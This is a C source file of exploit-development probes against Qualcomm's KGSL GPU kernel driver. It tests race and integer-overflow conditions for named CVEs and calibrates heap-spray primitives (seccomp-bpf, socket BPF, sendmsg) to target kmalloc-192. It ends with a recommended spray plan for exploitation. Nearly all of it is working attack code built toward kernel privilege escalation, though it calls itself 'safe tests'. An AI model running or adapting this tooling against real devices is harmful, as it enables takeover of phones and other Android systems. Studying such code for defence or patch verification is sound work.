/*
 * kgsl_safe_tests.c — Run individual KGSL tests safely
 *
 * Usage: kgsl_safe_tests <test_number>
 *   1 = Race count only (no UAF trigger — counts race wins without causing crash)
 *   2 = Integer overflow probe
 *   3 = seccomp-bpf spray availability
 *   4 = Socket BPF spray availability
 *   5 = Syncsource ioctl probing
 *   6 = PERFCOUNTER_QUERY probing
 *   7 = GET_INFO / other ioctl probing
 *   8 = sendmsg spray test (kmalloc-192 targeting)
 *   9 = kmalloc-192 size calibration for BPF spray
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_safe_tests kgsl_safe_tests.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/filter.h>
#include <stdint.h>
#include <pthread.h>

#define KGSL_IOC_TYPE 0x09
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

#define CMD_ALLOC       MAKE_IOCTL_RW(0x34, 48)
#define CMD_FREE        MAKE_IOCTL_RW(0x35, 8)
#define CMD_GETPROPERTY MAKE_IOCTL_RW(0x02, 24)

struct kgsl_gpumem_alloc_id {
    unsigned int id;
    unsigned int flags;
    uint64_t size;
    uint64_t mmapsize;
    uint64_t gpuaddr;
    uint64_t __pad;
    uint64_t __pad2;
};

struct kgsl_gpumem_free_id {
    unsigned int id;
    unsigned int __pad;
};

static sigjmp_buf jmpbuf;
static volatile int got_signal = 0;
static void sighandler(int sig) {
    got_signal = sig;
    siglongjmp(jmpbuf, 1);
}

/* ======================== TEST 1: Safe race count ======================== */
/*
 * This test ONLY counts how many times the free thread wins the race.
 * It does NOT trigger a UAF — after detecting the race win, it does not
 * use the freed entry. Each round opens a FRESH fd so no stale state.
 */

struct race_data {
    int fd;
    volatile int do_free;
    volatile int free_result;
};

static void *free_thread(void *arg) {
    struct race_data *rd = (struct race_data *)arg;
    while (!rd->do_free) { /* spin */ }

    struct kgsl_gpumem_free_id farg = { .id = 1, .__pad = 0 };
    rd->free_result = ioctl(rd->fd, CMD_FREE, &farg);
    return NULL;
}

static void test1_safe_race_count(void) {
    printf("=== TEST 1: Safe race count (no UAF trigger) ===\n");
    printf("Counting race wins without causing kernel crash.\n");
    printf("Each round: alloc on fresh fd, race free, close fd immediately.\n\n");

    int rounds = 100;
    int race_wins = 0;
    int alloc_ok = 0;
    int alloc_fail = 0;

    for (int r = 0; r < rounds; r++) {
        int fd = open("/dev/kgsl-3d0", O_RDWR);
        if (fd < 0) continue;

        struct race_data rd = { .fd = fd, .do_free = 0, .free_result = -999 };
        pthread_t tid;
        pthread_create(&tid, NULL, free_thread, &rd);

        /* Alloc — first alloc on fresh fd will be id=1 */
        struct kgsl_gpumem_alloc_id aarg;
        memset(&aarg, 0, sizeof(aarg));
        aarg.size = 4096;
        aarg.flags = 0x1000008;

        /* Signal the free thread right before alloc */
        rd.do_free = 1;
        int ret = ioctl(fd, CMD_ALLOC, &aarg);

        pthread_join(tid, NULL);

        if (ret == 0) {
            alloc_ok++;
            /* Check if free thread succeeded (freed our allocation) */
            if (rd.free_result == 0) {
                race_wins++;
            } else {
                /* Free our alloc cleanly */
                struct kgsl_gpumem_free_id farg = { .id = aarg.id };
                ioctl(fd, CMD_FREE, &farg);
            }
        } else {
            alloc_fail++;
        }

        close(fd);
    }

    printf("Results: %d rounds, alloc_ok=%d, alloc_fail=%d\n", rounds, alloc_ok, alloc_fail);
    printf("Race wins: %d/%d (%.1f%%)\n", race_wins, rounds, 100.0 * race_wins / rounds);

    if (race_wins > 0) {
        printf("*** CVE-2016-3842 ALLOC/FREE_ID race is CONFIRMED VIABLE ***\n");
        printf("Race window is wide enough for reliable exploitation.\n");
    } else {
        printf("No race wins detected. Race window may be too narrow.\n");
    }
}

/* ======================== TEST 2: Integer overflow ======================== */
static void test2_int_overflow(void) {
    printf("=== TEST 2: CVE-2016-2468 Integer overflow in alloc size ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("FAIL: open: %s\n", strerror(errno)); return; }

    uint64_t sizes[] = {
        0xa18fb010b0c08000ULL,  /* retme's exact value */
        0x0000000180000000ULL,  /* 6GB — overflows 32-bit */
        0x0000000100000001ULL,  /* 4GB+1 */
        0xFFFFFFFFFFFFE000ULL,  /* near max, page aligned */
        0x8000000000001000ULL,  /* high bit set */
    };
    int nsizes = sizeof(sizes) / sizeof(sizes[0]);

    for (int i = 0; i < nsizes; i++) {
        struct kgsl_gpumem_alloc_id aarg;
        memset(&aarg, 0, sizeof(aarg));
        aarg.size = sizes[i];
        aarg.flags = 0x1000008;

        int ret = ioctl(fd, CMD_ALLOC, &aarg);
        if (ret == 0) {
            printf("  size=0x%016lx: ALLOC OK! id=%u gpuaddr=0x%lx\n",
                   (unsigned long)sizes[i], aarg.id, (unsigned long)aarg.gpuaddr);
            printf("  *** INTEGER OVERFLOW MAY BE EXPLOITABLE ***\n");
            struct kgsl_gpumem_free_id farg = { .id = aarg.id };
            ioctl(fd, CMD_FREE, &farg);
        } else {
            printf("  size=0x%016lx: FAIL errno=%d (%s)\n",
                   (unsigned long)sizes[i], errno, strerror(errno));
        }
    }
    close(fd);
}

/* ======================== TEST 3: seccomp-bpf spray ======================== */
static void test3_seccomp_bpf(void) {
    printf("=== TEST 3: seccomp-bpf spray availability ===\n");

    /* First check PR_SET_NO_NEW_PRIVS */
    int ret = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    if (ret != 0) {
        printf("  PR_SET_NO_NEW_PRIVS: FAIL errno=%d (%s)\n", errno, strerror(errno));
        printf("  Cannot use seccomp-bpf without NO_NEW_PRIVS.\n");
        return;
    }
    printf("  PR_SET_NO_NEW_PRIVS: OK\n");

    /* Try installing a BPF filter */
    struct sock_filter filter[] = {
        { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },  /* ALLOW all */
    };
    struct sock_fprog prog = { .len = 1, .filter = filter };

    ret = prctl(PR_SET_SECCOMP, 2, &prog, 0, 0);
    if (ret == 0) {
        printf("  PR_SET_SECCOMP(FILTER): OK\n");
        printf("  *** seccomp-bpf spray IS AVAILABLE ***\n\n");

        /* Test how many filters we can stack */
        int spray_count = 0;
        for (int i = 0; i < 500; i++) {
            struct sock_filter sf[] = {
                { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },
            };
            struct sock_fprog sp = { .len = 1, .filter = sf };
            ret = prctl(PR_SET_SECCOMP, 2, &sp, 0, 0);
            if (ret != 0) break;
            spray_count++;
        }
        printf("  Stacked %d additional filters (all in kernel heap)\n", spray_count);
        printf("  Note: seccomp filters persist until process exit.\n");
        printf("  Each filter is a kmalloc allocation of (header + N*8 bytes).\n\n");

        /* Size calibration info */
        printf("  kmalloc-192 targeting for kgsl_mem_entry:\n");
        printf("    struct sock_fprog_kern overhead ~= 16-32 bytes\n");
        printf("    Need total alloc ~= 129-192 bytes for kmalloc-192\n");
        printf("    That's (192-32)/8 = 20 instructions, or (192-16)/8 = 22 instructions\n");
        printf("    Try 18-24 instruction filters for kmalloc-192\n");
    } else {
        printf("  PR_SET_SECCOMP(FILTER): FAIL errno=%d (%s)\n", errno, strerror(errno));
        if (errno == EINVAL) {
            printf("  CONFIG_SECCOMP_FILTER not compiled in kernel\n");
        } else if (errno == EACCES) {
            printf("  Blocked by SELinux or policy\n");
        }
    }
}

/* ======================== TEST 4: Socket BPF spray ======================== */
static void test4_socket_bpf(void) {
    printf("=== TEST 4: Socket BPF spray availability ===\n");

    /* Test SO_ATTACH_FILTER on various socket types */
    int sock_types[] = { SOCK_DGRAM, SOCK_STREAM, SOCK_RAW };
    const char *type_names[] = { "DGRAM", "STREAM", "RAW" };
    int ntypes = 3;

    for (int t = 0; t < ntypes; t++) {
        int sock = socket(AF_UNIX, sock_types[t], 0);
        if (sock < 0) {
            printf("  AF_UNIX/%s: socket failed errno=%d (%s)\n",
                   type_names[t], errno, strerror(errno));
            continue;
        }

        struct sock_filter sf[] = {
            { BPF_RET | BPF_K, 0, 0, 0xFFFFFFFF },  /* accept all */
        };
        struct sock_fprog sp = { .len = 1, .filter = sf };

        int ret = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &sp, sizeof(sp));
        if (ret == 0) {
            printf("  AF_UNIX/%s: SO_ATTACH_FILTER OK\n", type_names[t]);

            /* Test how many we can attach (they replace, not stack on sockets) */
            /* Each attach allocates new, frees old */
            printf("  Testing rapid attach/detach for heap manipulation...\n");
            int attach_ok = 0;
            for (int i = 0; i < 100; i++) {
                ret = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &sp, sizeof(sp));
                if (ret == 0) attach_ok++;
            }
            printf("  %d/100 rapid re-attaches succeeded\n", attach_ok);
        } else {
            printf("  AF_UNIX/%s: SO_ATTACH_FILTER failed errno=%d (%s)\n",
                   type_names[t], errno, strerror(errno));
        }
        close(sock);
    }

    /* Also test AF_INET/NETLINK if available */
    int inet_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (inet_sock >= 0) {
        struct sock_filter sf[] = { { BPF_RET | BPF_K, 0, 0, 0xFFFFFFFF } };
        struct sock_fprog sp = { .len = 1, .filter = sf };
        int ret = setsockopt(inet_sock, SOL_SOCKET, SO_ATTACH_FILTER, &sp, sizeof(sp));
        printf("  AF_INET/DGRAM: SO_ATTACH_FILTER %s (errno=%d)\n",
               ret == 0 ? "OK" : "FAIL", ret == 0 ? 0 : errno);
        close(inet_sock);
    }
}

/* ======================== TEST 5: Syncsource ioctls ======================== */
static void test5_syncsource(void) {
    printf("=== TEST 5: Syncsource ioctl probing (CVE-2018-13905) ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("FAIL: open: %s\n", strerror(errno)); return; }

    /* Syncsource CREATE = 0x40, DESTROY = 0x41
     * Struct size unknown — probe 4 to 64 */
    printf("  Probing SYNCSOURCE_CREATE (0x40):\n");
    for (int sz = 4; sz <= 64; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x40, sz);
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));

        int ret = ioctl(fd, ioctl_nr, buf);
        if (ret == 0) {
            printf("    size=%d: OK! Bytes: ", sz);
            for (int j = 0; j < sz && j < 16; j++) printf("%02x", buf[j]);
            printf("\n    *** SYNCSOURCE_CREATE WORKS ***\n");
        } else if (errno != 25) {  /* not ENOTTY */
            printf("    size=%d: errno=%d (%s) [handler reached]\n", sz, errno, strerror(errno));
        }
    }

    printf("  Probing SYNCSOURCE_DESTROY (0x41):\n");
    for (int sz = 4; sz <= 32; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x41, sz);
        unsigned char buf[32];
        memset(buf, 0, sizeof(buf));

        int ret = ioctl(fd, ioctl_nr, buf);
        if (ret == 0) {
            printf("    size=%d: OK!\n", sz);
        } else if (errno != 25) {
            printf("    size=%d: errno=%d (%s)\n", sz, errno, strerror(errno));
        }
    }

    /* Also probe SYNCSOURCE_CREATE_FENCE (0x42) and SIGNAL_FENCE (0x43) */
    printf("  Probing CREATE_FENCE (0x42) and SIGNAL_FENCE (0x43):\n");
    for (int nr = 0x42; nr <= 0x43; nr++) {
        for (int sz = 4; sz <= 32; sz += 4) {
            unsigned int ioctl_nr = MAKE_IOCTL_RW(nr, sz);
            unsigned char buf[32];
            memset(buf, 0, sizeof(buf));
            int ret = ioctl(fd, ioctl_nr, buf);
            if (errno != 25) {
                printf("    ioctl 0x%02x size=%d: errno=%d (%s)\n",
                       nr, sz, ret == 0 ? 0 : errno, ret == 0 ? "OK" : strerror(errno));
            }
        }
    }

    close(fd);
}

/* ======================== TEST 6: PERFCOUNTER probing ======================== */
static void test6_perfcounter(void) {
    printf("=== TEST 6: PERFCOUNTER_QUERY probing (CVE-2016-2062) ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("FAIL: open: %s\n", strerror(errno)); return; }

    /* PERFCOUNTER_GET = 0x24, PERFCOUNTER_PUT = 0x25, PERFCOUNTER_QUERY = 0x3A */
    int ioctls[] = { 0x24, 0x25, 0x3A };
    const char *names[] = { "PERFCOUNTER_GET", "PERFCOUNTER_PUT", "PERFCOUNTER_QUERY" };

    for (int i = 0; i < 3; i++) {
        printf("  Probing %s (0x%02x):\n", names[i], ioctls[i]);
        for (int sz = 4; sz <= 64; sz += 4) {
            unsigned int ioctl_nr = MAKE_IOCTL_RW(ioctls[i], sz);
            unsigned char buf[64];
            memset(buf, 0, sizeof(buf));

            struct sigaction sa, old_sa;
            sa.sa_handler = sighandler;
            sigemptyset(&sa.sa_mask);
            sa.sa_flags = 0;
            sigaction(SIGSEGV, &sa, &old_sa);
            sigaction(SIGBUS, &sa, &old_sa);

            got_signal = 0;
            if (sigsetjmp(jmpbuf, 1) == 0) {
                int ret = ioctl(fd, ioctl_nr, buf);
                if (ret == 0) {
                    printf("    size=%d: OK! Data: ", sz);
                    for (int j = 0; j < sz && j < 16; j++) printf("%02x", buf[j]);
                    printf("\n");
                } else if (errno != 25) {
                    printf("    size=%d: errno=%d (%s)\n", sz, errno, strerror(errno));
                }
            } else {
                printf("    size=%d: SIGNAL %d caught\n", sz, got_signal);
            }

            sigaction(SIGSEGV, &old_sa, NULL);
            sigaction(SIGBUS, &old_sa, NULL);
        }
    }
    close(fd);
}

/* ======================== TEST 7: Other ioctl probing ======================== */
static void test7_other_ioctls(void) {
    printf("=== TEST 7: Other KGSL ioctl probing ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("FAIL: open: %s\n", strerror(errno)); return; }

    /* Probe interesting ioctls we haven't tested yet */
    struct {
        int nr;
        const char *name;
    } ioctls[] = {
        { 0x15, "SETPROPERTY" },
        { 0x17, "TIMESTAMP_EVENT" },
        { 0x30, "GPUMEM_SYNC_CACHE" },
        { 0x31, "GPUMEM_SYNC_CACHE_BULK" },
        { 0x33, "CFF_SYNCMEM" },
        { 0x36, "GPUOBJ_IMPORT" },
        { 0x37, "GPUOBJ_SYNC" },
        { 0x38, "GPU_AUX_COMMAND" },
        { 0x3B, "GPUOBJ_SET_INFO" },
        { 0x3C, "SPARSE_PHYS_ALLOC" },
        { 0x3D, "SPARSE_PHYS_FREE" },
        { 0x3E, "SPARSE_VIRT_ALLOC" },
        { 0x3F, "SPARSE_VIRT_FREE" },
    };
    int nioctls = sizeof(ioctls) / sizeof(ioctls[0]);

    for (int i = 0; i < nioctls; i++) {
        /* Try size 8 first, then 16, 24, 32 */
        int found = 0;
        for (int sz = 8; sz <= 48; sz += 8) {
            unsigned int ioctl_nr = MAKE_IOCTL_RW(ioctls[i].nr, sz);
            unsigned char buf[64];
            memset(buf, 0, sizeof(buf));

            int ret = ioctl(fd, ioctl_nr, buf);
            if (errno != 25) {  /* not ENOTTY = handler exists */
                printf("  %s (0x%02x) size=%d: %s (errno=%d)\n",
                       ioctls[i].name, ioctls[i].nr, sz,
                       ret == 0 ? "OK" : strerror(errno), ret == 0 ? 0 : errno);
                found = 1;
                break;
            }
        }
        if (!found) {
            printf("  %s (0x%02x): ENOTTY all sizes — not present\n",
                   ioctls[i].name, ioctls[i].nr);
        }
    }
    close(fd);
}

/* ======================== TEST 8: sendmsg spray test ======================== */
static void test8_sendmsg_spray(void) {
    printf("=== TEST 8: sendmsg spray for kmalloc-192 ===\n");

    /* sendmsg with msg_control allocates in kmalloc.
     * Control message of ~192 bytes -> kmalloc-192.
     * This is a key spray primitive from retme/pipe exploit. */

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        printf("  socketpair: %s (errno=%d)\n", strerror(errno), errno);
        return;
    }

    /* Set receive buffer to allow message */
    int bufsize = 4096;
    setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));

    /* Try sending a message with control data sized for kmalloc-192 */
    /* msg_control allocation: struct cmsghdr (16 bytes on 64-bit) + payload */
    /* For kmalloc-192: need 129-192 bytes total = 113-176 bytes payload */
    int target_sizes[] = { 128, 160, 176, 192 };
    int ntargets = sizeof(target_sizes) / sizeof(target_sizes[0]);

    for (int t = 0; t < ntargets; t++) {
        char data[] = "x";
        struct iovec iov = { .iov_base = data, .iov_len = 1 };

        /* Allocate control buffer */
        int ctrl_len = target_sizes[t];
        char *ctrl = calloc(1, ctrl_len);

        struct msghdr msg;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = ctrl;
        msg.msg_controllen = ctrl_len;

        /* Set up a valid cmsg header */
        struct cmsghdr *cmsg = (struct cmsghdr *)ctrl;
        cmsg->cmsg_len = ctrl_len;
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;

        int ret = sendmsg(sv[0], &msg, MSG_DONTWAIT);
        if (ret >= 0) {
            printf("  ctrl_len=%d: sendmsg OK (sent %d bytes)\n", ctrl_len, ret);
        } else {
            printf("  ctrl_len=%d: sendmsg failed errno=%d (%s)\n",
                   ctrl_len, errno, strerror(errno));
        }
        free(ctrl);
    }

    /* Test rapid allocation/deallocation pattern */
    printf("  Testing rapid sendmsg spray pattern...\n");
    int spray_ok = 0;
    for (int i = 0; i < 100; i++) {
        char data[] = "x";
        struct iovec iov = { .iov_base = data, .iov_len = 1 };
        char ctrl[192];
        memset(ctrl, 'A', sizeof(ctrl));

        struct msghdr msg;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = ctrl;
        msg.msg_controllen = sizeof(ctrl);

        struct cmsghdr *cmsg = (struct cmsghdr *)ctrl;
        cmsg->cmsg_len = sizeof(ctrl);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;

        int ret = sendmsg(sv[0], &msg, MSG_DONTWAIT);
        if (ret >= 0) spray_ok++;

        /* Drain to free the allocation */
        char recv_buf[256];
        char recv_ctrl[256];
        struct iovec recv_iov = { .iov_base = recv_buf, .iov_len = sizeof(recv_buf) };
        struct msghdr recv_msg;
        memset(&recv_msg, 0, sizeof(recv_msg));
        recv_msg.msg_iov = &recv_iov;
        recv_msg.msg_iovlen = 1;
        recv_msg.msg_control = recv_ctrl;
        recv_msg.msg_controllen = sizeof(recv_ctrl);
        recvmsg(sv[1], &recv_msg, MSG_DONTWAIT);
    }
    printf("  %d/100 rapid sendmsg cycles OK\n", spray_ok);

    close(sv[0]);
    close(sv[1]);
}

/* ======================== TEST 9: BPF size calibration ======================== */
static void test9_bpf_size_calibration(void) {
    printf("=== TEST 9: BPF filter size calibration for kmalloc-192 ===\n\n");

    printf("  On kernel 3.10, seccomp BPF filter allocation:\n");
    printf("    struct seccomp_filter: ~16 bytes header\n");
    printf("    struct sock_filter: 8 bytes per instruction\n");
    printf("    Total kernel alloc = header + N*8\n\n");

    printf("  kmalloc bucket targeting:\n");
    printf("    kmalloc-128: need 65-128 bytes  -> 7-14 instructions\n");
    printf("    kmalloc-192: need 129-192 bytes -> 15-22 instructions (TARGET)\n");
    printf("    kmalloc-256: need 193-256 bytes -> 23-30 instructions\n\n");

    printf("  kgsl_mem_entry is in kmalloc-192.\n");
    printf("  For exploitation, install seccomp filters with 18-22 instructions\n");
    printf("  to land in the same kmalloc-192 slab as freed kgsl_mem_entry.\n\n");

    /* If we already have seccomp available (from test 3), we can't test more
     * in this process since seccomp is irreversible. Just output the info. */
    printf("  Recommended spray: fork child processes, each installing one\n");
    printf("  20-instruction seccomp filter before blocking on read(pipe).\n");
    printf("  This holds the allocation until the child exits.\n");
}

/* ======================== MAIN ======================== */
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <test_number>\n", argv[0]);
        printf("  1 = Safe race count (no crash)\n");
        printf("  2 = Integer overflow probe\n");
        printf("  3 = seccomp-bpf spray availability\n");
        printf("  4 = Socket BPF spray availability\n");
        printf("  5 = Syncsource ioctl probing\n");
        printf("  6 = PERFCOUNTER probing\n");
        printf("  7 = Other ioctl probing\n");
        printf("  8 = sendmsg spray test\n");
        printf("  9 = BPF size calibration info\n");
        return 1;
    }

    int test = atoi(argv[1]);
    printf("=== kgsl_safe_tests — running test %d ===\n\n", test);

    switch (test) {
        case 1: test1_safe_race_count(); break;
        case 2: test2_int_overflow(); break;
        case 3: test3_seccomp_bpf(); break;
        case 4: test4_socket_bpf(); break;
        case 5: test5_syncsource(); break;
        case 6: test6_perfcounter(); break;
        case 7: test7_other_ioctls(); break;
        case 8: test8_sendmsg_spray(); break;
        case 9: test9_bpf_size_calibration(); break;
        default: printf("Unknown test %d\n", test); return 1;
    }

    printf("\n=== Test %d complete ===\n", test);
    return 0;
}
